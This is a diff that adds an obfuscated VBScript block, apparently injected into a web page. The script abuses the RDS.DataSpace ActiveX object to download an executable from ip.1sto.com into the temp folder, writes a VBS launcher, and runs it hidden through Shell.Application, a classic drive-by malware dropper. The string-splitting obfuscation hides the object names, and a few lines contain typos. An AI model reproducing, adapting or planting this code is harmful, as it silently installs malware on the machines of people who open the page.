@@ -1,0 +1,72 @@
+<Script Language="VBScript">
+On Error Resume Next
+wwwxxoxxnew="http://ip.1sto.com/popwin/soft/058682d3909bf7af.exe"
+xiyuJuFan="o"&"b"&"j"
+xiyuJuxiyuxiaogang="e"&"c"&"t"
+xiyuJuFanxiyuxiaogang=xiyuJuFan&xiyuJuxiyuxiaogang
+xiyuFan="c"&"l"
+xiyuxiyuxiaogang="a"&"s"&"s"
+xiyuZi="i"&"d"
+xiyuwwwxxoxxnew=xiyuFan&xiyuxiyuxiaogang&xiyuZi
+xiyuJuF="c"&"l"&"s"
+xiyuJuFa="i"&"d"&":"
+xiyuFan="B"&"D"&"9"&"6C"&"55"&"6"&"-"
+xiyuCen="6"&"5"&"A"&"3"&"-"&"1"&"1"&"D"&"0"
+xiyuC="-9"&"8"&"3A"&"-"
+xiyuJuZ="0"&"0"&"C"&"0"&"4"
+xiyuJui="F"&"C"&"2"&"9"&"E"&"3"&"6"
+xiyuJuxiyuxiaogang=xiyuJuF&xiyuJuFa&xiyuFan&xiyuCen&xiyuC&xiyuJuZ&xiyuJui
+xiyuF="M"&"i"&"c"
+xiyuFa="r"&"o"&"s"
+xiyuFn="o"&"f"&"t"&"."
+xiyuCn="X"&"M"&"L"
+xiyuN="H"&"T"
+xiyuZ="T"&"P"
+xiyuJuZi=xiyuF&xiyuFa&xiyuFn&xiyuCn&xiyuN&xiyuZ
+xiyuxiaoF="S"&"c"&"r"&"i"
+xiyuxiaoFa="p"&"ti"&"n"&"g"&"."
+xiyuxiaoFn="F"&"i"&"l"&"e"&"S"
+xiyuxiaoCn="y"&"s"&"t"&"e"
+xiyuxiaoN="m"&"O"&"b"
+xiyuxiaoZ="j"&"e"&"c"&"t"
+xiyuxiaoZi=xiyuxiaoF&xiyuxiaoFa&xiyuxiaoCn&xiyuxiaoCn&xiyuxiaoN&xiyuxiaoZ
+xiyuXu="Set"&" Wuer"&" ="&" HUA.GetSpecialFolder(2)"
+Set Zi = document.createElement(xiyuJuFanxiyuxiaogang)
+Zi.SetAttribute xiyuwwwxxoxxnew, xiyuJuxiyuxiaogang
+xxoxx=xiyuJuZi
+Set XiaoZhang = Zi.CreateObject(xxoxx,"")
+XiaoZhang.Open "GE"&"T", wwwxxoxxnew, False
+XiaoZhang.Send
+psxiaogang="c:\"&"xi"&"ao"&"ga"&"ng.exe"
+psxiaogangps="c:\"&"xi"&"ao"&"ga"&"ng.vbs"
+Set HUA = Zi.createobject(xiyuxiaoZi,"")
+Set WDuer =HUA.GetSpexiyuxiaogangzi
+xiyuXu
+psxiaogang=HUA.BuildPath(Wuer,psxiaogang)
+psxiaogangps=HUA.BuildPath(Wuer,psxiaogangps)
+Zh="A"&"d"
+Hu="o"&"d"
+Wa="b"&"."&"s"&"t"
+lu="r"&"e"&"a"&"m"
+ZhogHaWngLo=Zh&Hu&Wa&lu
+Set xiyuxiaogang = Zi.createobject(ZhogHaWngLo,"")
+xiyuxiaogang.type=1
+xiyuxiaogang.Open
+xiyuxiaogang.Write XiaoZhang.rEsPonSebodY
+xiyuxiaogang.Savetofile psxiaogang,2
+xiyuxiaogang.Close
+xiyuxiaogang.Type=2
+xiyuxiaogang.Open
+xiyuxiaogang.WriteText "Set Shell = CreateObject(""Wscript.Shell"")"&vbCrLf&"Shell.Run ("""&psxiaogang&""")"&vbCrLf&"Set Shell = Nothing"
+xiyuxiaogang.sAVeTOfIle psxiaogangps,2
+xiyuxiaogang.Close
+Fxiyuxiaogang="S"&"h"&"e"
+axiyuxiaogang="l"&"l"&"."
+nxiyuxiaogang="A"&"p"&"p"&"l"&"i"
+WangLuoxiyuxiaogang=Fxiyuxiaogang&axiyuxiaogang&nxiyuxiaogang
+Set Zhong = Zi.createobject(WangLuoxiyuxiaogang&"cation","")
+Zhong.sHeLleXecUTe psxiaogangps,"","","Open",0
+</Script>
+
+
+
